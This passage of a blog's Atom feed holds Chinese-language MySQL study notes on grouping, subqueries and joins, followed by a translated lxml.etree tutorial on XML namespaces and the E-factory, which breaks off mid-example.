anvil</td><td>13.22</td></tr><tr><td>DTNTR</td><td>1003</td><td>Detonator</td><td>13.00</td></tr><tr><td>DB</td><td>1003</td><td>Carrots</td><td>2.53</td></tr><tr><td>FU1</td><td>1002</td><td>Fuses</td><td>12.3</td></tr><tr><td>JP1000</td><td>1005</td><td>JetPack 1000</td><td>55.00</td></tr></tbody></table><p>使用语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; SELECT vend_id, prod_name</span><br><span class="line">FROM products</span><br><span class="line">GROUP BY vend_id;</span><br></pre></td></tr></table></figure><p>得到结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">|-----------------------|</span><br><span class="line">| vend_id | prod_name   |</span><br><span class="line">|-----------------------|</span><br><span class="line">|1001     | .5 ton anvil|</span><br><span class="line">|1002  | Fuses    |</span><br><span class="line">|1003  | Detonator|</span><br><span class="line">|1005  | JetPack 1000|</span><br><span class="line">|-----------------------|</span><br></pre></td></tr></table></figure><p>可以看出每个分组只返回一条数据（尽管其有不只一条数据）</p><p><strong>分组与排序之差异</strong></p><ul><li>GROUP BY<ul><li>任意列都可以使用（甚至非选择列也可以）</li><li>不一定需要使用到它</li></ul></li><li>ORDER BY<ul><li>分组行，输出不一定是分组的顺序（对输出顺序有要求时有必要使用 ORDER BY ）</li><li>只能使用 选择列 或者表达式列，且必须使用每个选择列表达式（如果有）</li><li>如果与聚集函数一起使用列（或表达式），则必须使用</li></ul></li></ul><p><strong>SELETE 子句顺序</strong></p><p>SELECT ===&gt; FROM ===&gt; [ WHERE ] ===&gt; [ GROUP BY ] ===&gt; [HAVING] ===&gt; [ ORDER BY ] ===&gt; [ LIMIT ]</p><h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><p>有关：<code>SELECT COUNT(*) FROM orders WHERE cust_id = cust_id;</code> 的理解，其于 <code>SELECT COUNT(*) FROM orders, customers WHERE orders.cust_id = customers.cust_id;</code> 有什么不同？</p><p><strong>orders:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">| cust_id |</span><br><span class="line">|  1001   |</span><br><span class="line">|  1001   |</span><br><span class="line">|  1002   |</span><br><span class="line">|  1004   |</span><br><span class="line">|  1001   |</span><br><span class="line">|  1003   |</span><br><span class="line">|  1002   |</span><br></pre></td></tr></table></figure><p><strong>customers:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| cust_id |</span><br><span class="line">|  1001   |</span><br><span class="line">|  1002   |</span><br><span class="line">|  1003   |</span><br><span class="line">|  1004   |</span><br></pre></td></tr></table></figure><p><strong>执行第一个语句时结果：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; SELECT COUNT(*) FROM test WHERE cust_id = cust_id;</span><br><span class="line">|----------|</span><br><span class="line">| COUNT(*) |</span><br><span class="line">|----------|</span><br><span class="line">| 7   |</span><br><span class="line">|----------|</span><br></pre></td></tr></table></figure><p><strong>执行第二个语句结果：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; SELECT COUNT(*) FROM orders, customers WHERE orders.cust_id = customers.cust_id;</span><br><span class="line">|----------|</span><br><span class="line">| COUNT(*) |</span><br><span class="line">|----------|</span><br><span class="line">| 7   |</span><br><span class="line">|----------|</span><br></pre></td></tr></table></figure><p><strong>再看下列语句执行结果：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; SELECT * FROM orders, customers WHERE orders.cust_id = customers.cust_id;</span><br><span class="line">左为orders，右为customers</span><br><span class="line">id  cust_id id  cust_id</span><br><span class="line">11001 1 1001</span><br><span class="line">21001 1 1001</span><br><span class="line">31002 2 1002</span><br><span class="line">41004 4 1004</span><br><span class="line">51001 1 1001</span><br><span class="line">61003 3 1003</span><br><span class="line">71002 2 1002</span><br></pre></td></tr></table></figure><p><strong>结论：</strong></p><p>不难看出，当使用限定的表名，列名时，大致执行顺序如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(取出orders.cust_id != 空):</span><br><span class="line">查找customers</span><br><span class="line">    <span class="keyword">if</span>(找到 customers.cust_id == orders.cust_id):</span><br><span class="line">        拼接结果</span><br></pre></td></tr></table></figure><p>由于，orders里的cust_id均来源于customers的cust_id，故所有条目都能找到结果，所以COUNT(*) 返回7（也就是orders里的条目数）</p><p>同理，可以解释语句1里为什么也返回7。</p><p><strong>再看：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; SELECT * FROM orders, customers WHERE orders.cust_id = customers.cust_id ORDER BY cust_name;</span><br><span class="line">num       cust_id  cust_id      cust_name                city  state zip country   contact</span><br><span class="line">200051000110001Coyote Inc.200 Maple LaneDetroit MI44444USA     Y Lee</span><br><span class="line">200091000110001Coyote Inc.200 Maple LaneDetroit  MI44444USA     Y Lee</span><br><span class="line">200081000510005E Fudd4545 53rd StreetChicago IL54545USA     E Fudd</span><br><span class="line">200061000310003Wascals1 Sunny Place    Muncie IN42222USA     Jim Jones</span><br><span class="line">200071000410004Yosemite Place          Phoenix AZ88888USA     Y Sam</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">SELECT cust_name, cust_state, (</span><br><span class="line">       SELECT COUNT(*) FROM orders        </span><br><span class="line">       WHERE orders.cust_id = customers.cust_id) AS orders       </span><br><span class="line">FROM customers</span><br><span class="line">ORDER BY cust_name;</span><br><span class="line">+----------------------------+</span><br><span class="line">|Coyote Inc.MI2|</span><br><span class="line">|E FuddIL1|</span><br><span class="line">|Mouse HouseOH0|</span><br><span class="line">|WascalsIN1|</span><br><span class="line">|Yosemite PlaceAZ1|</span><br><span class="line">+----------------------------+</span><br><span class="line"></span><br><span class="line">SELECT cust_name, COUNT(*) FROM orders, customers</span><br><span class="line">WHERE orders.cust_id = customers.cust_id</span><br><span class="line">GROUP BY cust_name;</span><br></pre></td></tr></table></figure><p>就很好理解了！</p><h3 id="联结表"><a href="#联结表" class="headerlink" title="联结表"></a>联结表</h3><p>在联结两个表时，实际上是对第一个表的每一行与第二个表的每一行“组合”，WHERE 子句作为过滤条件，只包含匹配联结条件的行。如果忘写WHERE子句，那么结果会是一个笛卡尔积，返回的数目是第一个表的行数乘以第二个表的行数。（又称：叉联结）</p><h4 id="内部联结-（又：等值联结）"><a href="#内部联结-（又：等值联结）" class="headerlink" title="内部联结 （又：等值联结）"></a>内部联结 （又：等值联结）</h4><p>下面两种写法效果一致：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.&gt; SELECT vend_name, prod_name, prod_price</span><br><span class="line">FROM vendors, products</span><br><span class="line">WHERE vendors.vend_id = products.vend_id;</span><br><span class="line"></span><br><span class="line">2.&gt; INNER JOIN 写法</span><br><span class="line">&gt;SELECT vend_name, prod_name, prod_price</span><br><span class="line">FROM vendors INNER JOIN products</span><br><span class="line">ON vendors.vend_id = products.vend_id;</span><br></pre></td></tr></table></figure><h4 id="高级联结"><a href="#高级联结" class="headerlink" title="高级联结"></a>高级联结</h4><ul><li>自联结</li><li>自然联结<ul><li>内部联结 INNER JOIN 的一个子集</li></ul></li><li>外部联结</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT p1.prod_id, p1.prod_name</span><br><span class="line">FROM products AS p1, products AS p2</span><br><span class="line">WHERE p1.vend_id = p2.vend_id AND</span><br><span class="line">p2.prod_id = &quot;DTNTR&quot;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有关MySQL使用的总结&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>lxml.etree tutorial - final part</title>
    <link href="https://pwn4justice.github.io/2019/06/21/lxml-etree-tutorial-final-part/"/>
    <id>https://pwn4justice.github.io/2019/06/21/lxml-etree-tutorial-final-part/</id>
    <published>2019-06-21T12:51:17.000Z</published>
    <updated>2019-07-30T06:11:28.723Z</updated>
    
    <content type="html"><![CDATA[<p>本文内容：</p><ul><li>命名空间</li><li>E-factory 工厂方法</li><li>元素路径</li></ul><a id="more"></a><h3 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h3><p>ElementTree API 尽可能地避免命名空间前缀，而是使用真正的命名空间（URI）来代替：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>xhtml = etree.Element(<span class="string">"&#123;http://www.w3.org/1999/xhtml&#125;html"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>body = etree.SubElement(xhtml, <span class="string">"&#123;http://www.w3.org/1999/xhtml&#125;body"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>body.text = <span class="string">"Hello World"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(etree.tostring(xhtml, pretty_print=<span class="literal">True</span>))</span><br><span class="line">&lt;html:html xmlns:html=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">  &lt;html:body&gt;Hello World&lt;/html:body&gt;</span><br><span class="line">&lt;/html:html&gt;</span><br></pre></td></tr></table></figure><p>这种使用方法一开始是由 James Clark 提出来的。其一个主要的优点是为标记（tag）提供了一个通用的限定名，而不管文档中是否使用或定义了任何前缀。通过移除不直观的前缀，使得声明命名空间的代码更加简洁且易于编写。<br>正如你从例子中可以看到的那样，前缀只是当你序列化结果的时候才重要。然而，上面的代码看起来有些冗余。且一遍一遍地重新输入或者复制会导致更加容易出错。因此人们普遍将命名空间 URI 保存在一个全局变量里。为了使命名空间前缀适应序列化操作，你可以向 Element 工厂方法传递一个映射（mapping），比如：定义一个默认命名空间：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>XHTML_NAMESPACE = <span class="string">"http://www.w3.org/1999/xhtml"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>XHTML = <span class="string">"&#123;%s&#125;"</span> % XHTML_NAMESPACE//存储命名空间URI的全局变量 XHTML </span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>NSMAP = &#123;<span class="literal">None</span> : XHTML_NAMESPACE&#125; <span class="comment"># the default namespace (no prefix)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>xhtml = etree.Element(XHTML + <span class="string">"html"</span>, nsmap=NSMAP) <span class="comment"># lxml only!</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>body = etree.SubElement(xhtml, XHTML + <span class="string">"body"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>body.text = <span class="string">"Hello World"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(etree.tostring(xhtml, pretty_print=<span class="literal">True</span>))</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">  &lt;body&gt;Hello World&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>你也可以使用 ‘QName 帮助类’ 来构建或拆解 ‘限定标签名’ ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>tag = etree.QName(<span class="string">'http://www.w3.org/1999/xhtml'</span>, <span class="string">'html'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(tag.localname)</span><br><span class="line">html</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(tag.namespace)</span><br><span class="line">http://www.w3.org/<span class="number">1999</span>/xhtml</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(tag.text)</span><br><span class="line">&#123;http://www.w3.org/<span class="number">1999</span>/xhtml&#125;html</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tag = etree.QName(<span class="string">'&#123;http://www.w3.org/1999/xhtml&#125;html'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(tag.localname)</span><br><span class="line">html</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(tag.namespace)</span><br><span class="line">http://www.w3.org/<span class="number">1999</span>/xhtml</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = etree.Element(<span class="string">'&#123;http://www.w3.org/1999/xhtml&#125;html'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tag = etree.QName(root)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(tag.localname)</span><br><span class="line">html</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tag = etree.QName(root, <span class="string">'script'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(tag.text)</span><br><span class="line">&#123;http://www.w3.org/<span class="number">1999</span>/xhtml&#125;script</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tag = etree.QName(<span class="string">'&#123;http://www.w3.org/1999/xhtml&#125;html'</span>, <span class="string">'script'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(tag.text)</span><br><span class="line">&#123;http://www.w3.org/<span class="number">1999</span>/xhtml&#125;script</span><br></pre></td></tr></table></figure><p>lxml.etree 允许你通过 <code>.nsmap</code> 属性来寻找为某个节点定义的命名空间：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>xhtml.nsmap</span><br><span class="line">&#123;<span class="literal">None</span>: <span class="string">'http://www.w3.org/1999/xhtml'</span>&#125;</span><br></pre></td></tr></table></figure><p>然而，这只包括在元素上下文中已知的所有前缀，而不仅仅是那些它定义自己的前缀。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = etree.Element(<span class="string">'root'</span>, nsmap=&#123;<span class="string">'a'</span>: <span class="string">'http://a.b/c'</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>child = etree.SubElement(root, <span class="string">'child'</span>,</span><br><span class="line"><span class="meta">... </span>                         nsmap=&#123;<span class="string">'b'</span>: <span class="string">'http://b.c/d'</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(root.nsmap)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(child.nsmap)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>child.nsmap[<span class="string">'a'</span>]</span><br><span class="line"><span class="string">'http://a.b/c'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>child.nsmap[<span class="string">'b'</span>]</span><br><span class="line"><span class="string">'http://b.c/d'</span></span><br></pre></td></tr></table></figure><p>因此，修改返回的字典对元素没有实质的影响。对其所作的所有改变都会被忽略。<br>属性上的命名空间工作原理类似，但从2.3版本开始，lxml.etree 将会确保属性使用了前缀命名空间声明。这是因为 XML 名称空间规范 (第6.2节) 不认为没有前缀的属性名称位于名称空间中，所以即使它们出现在名称空间元素中，也可能在序列化解析的过程中丢失名称空间。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>body.set(XHTML + <span class="string">"bgcolor"</span>, <span class="string">"#CCFFAA"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(etree.tostring(xhtml, pretty_print=<span class="literal">True</span>))</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">  &lt;body xmlns:html="http://www.w3.org/1999/xhtml" html:bgcolor="#CCFFAA"&gt;Hello World&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(body.get(<span class="string">"bgcolor"</span>))</span><br><span class="line"><span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>body.get(XHTML + <span class="string">"bgcolor"</span>)</span><br><span class="line"><span class="string">'#CCFFAA'</span></span><br></pre></td></tr></table></figure><p>你还可以使用具有完全限定名的 XPath：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>find_xhtml_body = etree.ETXPath(      <span class="comment"># lxml only !</span></span><br><span class="line"><span class="meta">... </span>    <span class="string">"//&#123;%s&#125;body"</span> % XHTML_NAMESPACE)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>results = find_xhtml_body(xhtml)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(results[<span class="number">0</span>].tag)</span><br><span class="line">&#123;http://www.w3.org/<span class="number">1999</span>/xhtml&#125;body</span><br></pre></td></tr></table></figure><p>方便起见，你可以在 lxml.etree 的所有迭代器（包括标签名和命名空间）中使用 * 通配符：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> el <span class="keyword">in</span> xhtml.iter(<span class="string">'*'</span>): print(el.tag)   <span class="comment"># any element</span></span><br><span class="line">&#123;http://www.w3.org/<span class="number">1999</span>/xhtml&#125;html</span><br><span class="line">&#123;http://www.w3.org/<span class="number">1999</span>/xhtml&#125;body</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> el <span class="keyword">in</span> xhtml.iter(<span class="string">'&#123;http://www.w3.org/1999/xhtml&#125;*'</span>): print(el.tag)</span><br><span class="line">&#123;http://www.w3.org/<span class="number">1999</span>/xhtml&#125;html</span><br><span class="line">&#123;http://www.w3.org/<span class="number">1999</span>/xhtml&#125;body</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> el <span class="keyword">in</span> xhtml.iter(<span class="string">'&#123;*&#125;body'</span>): print(el.tag)</span><br><span class="line">&#123;http://www.w3.org/<span class="number">1999</span>/xhtml&#125;body</span><br></pre></td></tr></table></figure><p>如果想要寻找没有命名空间的元素，要么使用空白的标签名，要么使用空的命名空间：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[ el.tag <span class="keyword">for</span> el <span class="keyword">in</span> xhtml.iter(<span class="string">'&#123;http://www.w3.org/1999/xhtml&#125;body'</span>) ]</span><br><span class="line">[<span class="string">'&#123;http://www.w3.org/1999/xhtml&#125;body'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[ el.tag <span class="keyword">for</span> el <span class="keyword">in</span> xhtml.iter(<span class="string">'body'</span>) ]</span><br><span class="line">[]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[ el.tag <span class="keyword">for</span> el <span class="keyword">in</span> xhtml.iter(<span class="string">'&#123;&#125;body'</span>) ]</span><br><span class="line">[]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[ el.tag <span class="keyword">for</span> el <span class="keyword">in</span> xhtml.iter(<span class="string">'&#123;&#125;*'</span>) ]</span><br><span class="line">[]</span><br></pre></td></tr></table></figure><h3 id="E-factory"><a href="#E-factory" class="headerlink" title="E-factory"></a>E-factory</h3><p>E-factory 提供了简单，紧凑的语法来生成 XML 和 HTML：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> lxml.builder <span class="keyword">import</span> E</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">CLASS</span><span class="params">(*args)</span>:</span> <span class="comment"># class is a reserved word in Python</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> &#123;<span class="string">"class"</span>:<span class="string">' '</span>.join(args)&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>html = page = (</span><br><span class="line"><span class="meta">... </span>  E.html(       <span class="comment"># create an Element called "html"</span></span><br><span class="line"><span class="meta">... </span>    E.head(</span><br><span class="line"><span class="meta">... </span>      E.title(<span class="string">"This is a sample document"</span>)</span><br><span class="line"><span class="meta">... </span>    ),</span><br><span class="line"><span class="meta">... </span>    E.body(</span><br><span class="line"><span class="meta">... </span>      E.h1(<span class="string">"Hello!"</span>, CLASS(<span class="string">"title"</span>)),</span><br><span class="line"><span class="meta">... </span>      E.p(<span class="string">"This is a paragraph with "</span>, E.b(<span class="string">"bold"</span>), <span class="string">" text in it!"</span>),</span><br><span class="line"><span class="meta">... </span>      E.p(<span class="string">"This is another paragraph, with a"</span>, <span class="string">"\n      "</span>,</span><br><span class="line"><span class="meta">... </span>        E.a(<span class="string">"link"</span>, href=<span class="string">"http://www.python.org"</span>), <span class="string">"."</span>),</span><br><span class="line"><span class="meta">... </span>      E.p(<span class="string">"Here are some reserved characters: &lt;spam&amp;egg&gt;."</span>),</span><br><span class="line"><span class="meta">... </span>      etree.XML(<span class="string">"&lt;p&gt;And finally an embedded XHTML fragment.&lt;/p&gt;"</span>),</span><br><span class="line"><span class="meta">... </span>    )</span><br><span class="line"><span class="meta">... </span>  )</span><br><span class="line"><span class="meta">... </span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(etree.tostring(page, pretty_print=<span class="literal">True</span>))</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;This is a sample document&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1 class="title"&gt;Hello!&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;This is a paragraph with &lt;b&gt;bold&lt;/b&gt; text in it!&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;This <span class="keyword">is</span> another paragraph, <span class="keyword">with</span> a</span><br><span class="line">      &lt;a href="http://www.python.org"&gt;link&lt;/a&gt;.&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;Here are some reserved characters: &amp;lt;spam&amp;amp;egg&amp;gt;.&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;And finally an embedded XHTML fragment.&lt;/p&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>基于属性访问的元素创建使其易于为 XML 语言构建一个简单的词汇表：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> lxml.builder <span class="keyword">import</span> ElementMaker <span class="comment"># lxml only !</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>E = ElementMaker(namespace=<span class="string">"http://my.de/fault/namespace"</span>,</span><br><span class="line"><span class="meta">... </span>                 nsmap=&#123;<span class="string">'p'</span> : <span class="string">"http://my.de/fault/namespace"</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>DOC = E.doc</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>TITLE = E.title</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>SECTION = E.section</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>PAR = E.par</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>my_doc = DOC(</span><br><span class="line"><span class="meta">... </span>  TITLE(<span class="string">"The dog and the hog"</span>),</span><br><span class="line"><span class="meta">... </span>  SECTION(</span><br><span class="line"><span class="meta">... </span>    TITLE(<span class="string">"The dog"</span>),</span><br><span class="line"><span class="meta">... </span>    PAR(<span class="string">"Once upon a time, ..."</span>),</span><br><span class="line"><span 